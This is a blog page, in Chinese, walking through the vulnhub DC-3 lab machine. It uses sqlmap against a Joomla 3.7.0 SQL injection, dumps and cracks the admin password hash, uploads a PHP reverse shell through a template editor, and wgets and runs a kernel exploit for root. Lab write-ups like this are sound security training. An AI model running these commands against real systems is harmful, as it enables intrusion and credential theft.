@@ -1,0 +1,1167 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/shiroha.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/shiroha.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="exploit,Joomla," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="vulnhub里的 DC-3 靶机 初学者难度">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub DC-3靶机">
+<meta property="og:url" content="http://www.ethushiroha.com/DC-3.html">
+<meta property="og:site_name" content="stdout">
+<meta property="og:description" content="vulnhub里的 DC-3 靶机 初学者难度">
+<meta property="og:locale">
+<meta property="og:image" content="http://49.234.181.139/wp-content/uploads/2020/04/image-1586230888126.png">
+<meta property="article:published_time" content="2020-07-20T01:34:10.000Z">
+<meta property="article:modified_time" content="2020-11-25T13:44:32.092Z">
+<meta property="article:author" content="stdout">
+<meta property="article:tag" content="exploit">
+<meta property="article:tag" content="Joomla">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://49.234.181.139/wp-content/uploads/2020/04/image-1586230888126.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.ethushiroha.com/DC-3.html"/>
+
+
+
+
+
+  <title>vulnhub DC-3靶机 | stdout</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">stdout</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-主页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            主页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-文章">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            文章
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-友联">
+          <a href="/py.html" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            友联
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.ethushiroha.com/DC-3.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="stdout">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">vulnhub DC-3靶机</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-20T09:34:10+08:00">
+                2020-07-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/exploit/" itemprop="url" rel="index">
+                    <span itemprop="name">exploit</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/exploit/DC/" itemprop="url" rel="index">
+                    <span itemprop="name">DC</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>vulnhub里的 DC-3 靶机</p>
+<p>初学者难度</p>
+<a id="more"></a>
+
+
+
+
+
+<h2 id="靶机地址"><a href="#靶机地址" class="headerlink" title="靶机地址"></a>靶机地址</h2><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-3,312/">vulnhub DC-3</a></p>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="NMAP扫描得到ip地址"><a href="#NMAP扫描得到ip地址" class="headerlink" title="NMAP扫描得到ip地址"></a>NMAP扫描得到ip地址</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.147.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.147.132</span><br><span class="line">Host is up (0.00074s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:44:28:03 (VMware)</span><br></pre></td></tr></table></figure>
+
+<p>得到靶机的ip地址为<code>192.168.147.132</code><br>进行更加详细的扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.147.132 -p0-65535</span><br><span class="line">Nmap scan report for 192.168.147.132                                                                                 </span><br><span class="line">Host is up (0.0026s latency).                                                                                        </span><br><span class="line">Not shown: 65535 closed ports                                                                                        </span><br><span class="line">PORT   STATE SERVICE VERSION                                                                                         </span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))                                                                  </span><br><span class="line">|_http-generator: Joomla! - Open Source Content Management                                                           </span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Home</span><br><span class="line">MAC Address: 00:0C:29:44:28:03 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   2.62 ms 192.168.147.132</span><br></pre></td></tr></table></figure>
+<p>只找到一个<code>http(80端口)</code>,得知是一个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/joomla/3104596?fr=aladdin"><code>Joomla</code></a></p>
+<h3 id="针对Joomla的攻击"><a href="#针对Joomla的攻击" class="headerlink" title="针对Joomla的攻击"></a>针对Joomla的攻击</h3><p>使用<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/181440.html">Joomscan</a>工具扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">perl joomscan.pl --url http://192.168.147.132</span><br><span class="line"></span><br><span class="line">Processing http://192.168.147.132 ...</span><br><span class="line"></span><br><span class="line">[+] FireWall Detector                                                        </span><br><span class="line">[++] Firewall not detected                                                   </span><br><span class="line">                                                                             </span><br><span class="line">[+] Detecting Joomla Version                                                 </span><br><span class="line">[++] Joomla 3.7.0                                                            </span><br><span class="line">                                                                             </span><br><span class="line">[+] Core Joomla Vulnerability                                                </span><br><span class="line">[++] Target Joomla core is not vulnerable                                    </span><br><span class="line">                                                                             </span><br><span class="line">[+] Checking Directory Listing                                               </span><br><span class="line">[++] directory has directory listing :                                       </span><br><span class="line">http://192.168.147.132/administrator/components                              </span><br><span class="line">http://192.168.147.132/administrator/modules                                 </span><br><span class="line">http://192.168.147.132/administrator/templates                               </span><br><span class="line">http://192.168.147.132/images/banners                                        </span><br><span class="line">                                                                             </span><br><span class="line">                                                                             </span><br><span class="line">[+] Checking apache info/status files                                        </span><br><span class="line">[++] Readable info/status files are not found                                </span><br><span class="line">                                                                             </span><br><span class="line">[+] admin finder                                                             </span><br><span class="line">[++] Admin page : http://192.168.147.132/administrator/                      </span><br><span class="line">                                                                             </span><br><span class="line">[+] Checking robots.txt existing                                             </span><br><span class="line">[++] robots.txt is not found                                                 </span><br><span class="line">                                                                             </span><br><span class="line">[+] Finding common backup files name                                         </span><br><span class="line">[++] Backup files are not found                                              </span><br><span class="line">                                                                             </span><br><span class="line">[+] Finding common log files name                                            </span><br><span class="line">[++] error log is not found                                                  </span><br><span class="line">                                                                             </span><br><span class="line">[+] Checking sensitive config.php.x file                                     </span><br><span class="line">[++] Readable config files are not found                              </span><br></pre></td></tr></table></figure>
+<p>找到了<code>admin</code>的登录页面,并且得出版本为<code>Joomla 3.7.0</code></p>
+<p>但是现在没有<code>admin</code>的密码,使用<code>searchsploit</code>工具查找<code>Joomla 3.7.0</code>存在的漏洞</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Joomla 3.7.0</span><br><span class="line">------------------------------------ ----------------------------------------</span><br><span class="line"> Exploit Title                      |  Path</span><br><span class="line">                                    | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------ ----------------------------------------</span><br><span class="line">Joomla! 3.7.0 - &#x27;com_fields&#x27; SQL In | exploits/php/webapps/42033.txt</span><br><span class="line">------------------------------------ ----------------------------------------</span><br></pre></td></tr></table></figure>
+<p>存在一个<code>SQL 注入</code>漏洞,并且给出了exp(信息太多了不全部写出,只给出关键信息)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Exploit Title: Joomla 3.7.0 - Sql Injection</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Date: 05-19-2017</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> CVE : - CVE-2017-8917</span></span><br><span class="line"></span><br><span class="line">URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</span><br><span class="line"></span><br><span class="line">Using Sqlmap: </span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>
+
+<p>那就直接用<code>sqlmap</code>一把梭</p>
+<h3 id="sqlmap-注入sql"><a href="#sqlmap-注入sql" class="headerlink" title="sqlmap 注入sql"></a>sqlmap 注入sql</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.147.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br><span class="line"></span><br><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] joomladb</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br></pre></td></tr></table></figure>
+<p>得出了数据库,然后读取数据表</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.147.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]</span><br><span class="line"></span><br><span class="line">***********************</span><br><span class="line">| #__update_sites     |</span><br><span class="line">| #__updates          |</span><br><span class="line">| #__user_keys        |</span><br><span class="line">| #__user_notes       |</span><br><span class="line">| #__user_profiles    |</span><br><span class="line">| #__user_usergroup_m |</span><br><span class="line">| #__usergroups       |</span><br><span class="line">| #__users            |</span><br><span class="line">| #__utf8_conversion  |</span><br><span class="line">| #__viewlevels       |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure>
+<p>得出数据表之后脱出数据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.147.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &quot;#__uesr&quot; --dump -p list[fullordering]</span><br><span class="line"></span><br><span class="line">+------+--------------------------+--------+----------------------------------------------------------------------------------------------+----------+--------------------------------------------------------------+</span><br><span class="line">| id   | email                    | name   | params                                                                                       | username | password                                                     |</span><br><span class="line">+------+--------------------------+--------+----------------------------------------------------------------------------------------------+----------+--------------------------------------------------------------+</span><br><span class="line">| 629  | freddy@norealaddress.net | admin  | &#123;&quot;admin_style&quot;:&quot;&quot;,&quot;admin_language&quot;:&quot;&quot;,&quot;language&quot;:&quot;&quot;,&quot;editor&quot;:&quot;&quot;,&quot;helpsite&quot;:&quot;&quot;,&quot;timezone&quot;:&quot;&quot;&#125; | admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |</span><br><span class="line">+------+--------------------------+--------+----------------------------------------------------------------------------------------------+----------+--------------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>得到了加密之后的admin的密码<br>保存进文件之后使用<code>john</code>工具爆破</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">john admin.txt</span><br><span class="line"></span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist</span><br><span class="line">snoopy           (?)</span><br></pre></td></tr></table></figure>
+<p>得到密码之后登陆进去</p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>先查看模板的名称,在<code>Extensions-&gt;Templetes</code> 看到是<code>beez3</code>模板,点进去之后看到文件夹,并且可以上传文件<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586230888126.png" alt="file"></p>
+<p>上传反弹shell<br><code>/usr/share/webshells/php/php-reverse-shell.php</code>,修改一下参数</p>
+<p>在地址栏访问<code>http://192.168.147.132/templates/beez3/html</code><br>在本地监听端口,找到刚刚上传的shell,并且运行<br>获得一个shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:&#x2F;home&#x2F;kali&#x2F;vulnhub&#x2F;dc-3# nc -vlp 8848</span><br><span class="line">listening on [any] 8848 ...</span><br><span class="line">192.168.147.132: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.147.130] from (UNKNOWN) [192.168.147.132] 52528</span><br><span class="line">Linux DC3VM 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU&#x2F;Linux</span><br><span class="line"> 13:48:01 up  2:02,  0 users,  load average: 0.00, 0.01, 0.07</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line">$ whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
+<p>然后想办法提权</p>
+<p>先找一下有没有不用密码的root指令,或者有setuid的</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/bin/ping</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ntfs-3g</span><br><span class="line">/bin/mount</span><br><span class="line">/tmp/39773/refcount_overflow/39772/ebpf_mapfd_doubleput_exploit/suidhelper</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/ubuntu-core-launcher</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/i386-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line"></span><br><span class="line">没啥用</span><br><span class="line"></span><br><span class="line">sudo -l</span><br><span class="line">sudo: no tty present and no askpass program specified</span><br></pre></td></tr></table></figure>
+
+<p>(结果使用内核的漏洞提权)</p>
+<p>先查看一下系统版本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /etc/issue</span></span><br><span class="line">Ubuntu 16.04 LTS \n \l</span><br></pre></td></tr></table></figure>
+<p>然后用<code>searchsploit</code>寻找漏洞</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> searchsploit <span class="string">&quot;Ubuntu 16.04&quot;</span></span></span><br><span class="line"></span><br><span class="line">Linux Kernel 4.4.x (Ubuntu 16.04) - &#x27;double-fdput()&#x27; bpf(BPF_PROG_LOAD) Pri | exploits/linux/local/39772.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /usr/share/exploitdb/exploits/linux/<span class="built_in">local</span>/39772.txt</span></span><br><span class="line"></span><br><span class="line">Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure>
+
+<p>在靶机上的<code>/tmp</code>文件夹下使用<code>wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</code>,并且解压,里面有一个<code>exploit.tar</code>,也解压,运行<code>complie.sh</code>编译会有警告,但是没关系,运行<code>doubleput</code>就能得到<code>root权限</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./doubleput</span></span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. if this worked, you&#x27;ll have a root shell in &lt;=60 seconds.</span><br><span class="line">suid file detected, launching rootshell...</span><br><span class="line">we have root privs now...</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/exploit/" rel="tag"><i class="fa fa-tag"></i> exploit</a>
+          
+            <a href="/tags/Joomla/" rel="tag"><i class="fa fa-tag"></i> Joomla</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/DC-2.html" rel="next" title="vulnhub DC-2靶机">
+                <i class="fa fa-chevron-left"></i> vulnhub DC-2靶机
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/DC-4.html" rel="prev" title="vulnhub DC-4靶机">
+                vulnhub DC-4靶机 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/head.png"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/ethushiroha" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
